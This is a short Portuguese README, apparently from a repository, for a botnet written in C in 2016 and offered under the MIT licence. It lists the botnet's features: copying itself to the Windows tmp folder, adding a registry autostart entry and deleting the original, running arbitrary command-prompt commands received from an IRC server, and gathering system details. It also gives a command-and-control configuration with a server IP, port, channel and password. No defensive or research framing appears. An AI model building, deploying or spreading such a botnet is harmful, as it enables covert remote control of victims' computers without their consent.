# Sobre a BotNet

Essa botnet foi dsenvolvida em 2016 com a linguagem C. Ela se conecta com um servidor irc e transmite mensagens e recebe comandos atrávés de lá.


## Funcionalidades

As funcionalidades da botnet são:

- Auto-Copia/Destruição ( A botnet se copia para a pasta tmp do windows, registra no regedit para iniciar automaticamente no sistema e se exclui. )
- Realiza comandos ( mesmos comandos do Prompt de comando )
- Captura informações do computador ( Captura sistema operacional, versão processador e arquitetura )
 
## Instalação

Utilizar o codigo com um copilador C.

## Como Usar

Alterar as seguintes linhas de configuração do servidor irc.

```
#define SERVER "193.10.255.100"
#define PORTA 6667
#define CANAL "#Z29uNGZsb3c"
#define SENHA "123456"
```

## Contribuições

Gabriel Arcanjo Laranjeira dos Santos

## Licença
[MIT](https://choosealicense.com/licenses/mit/)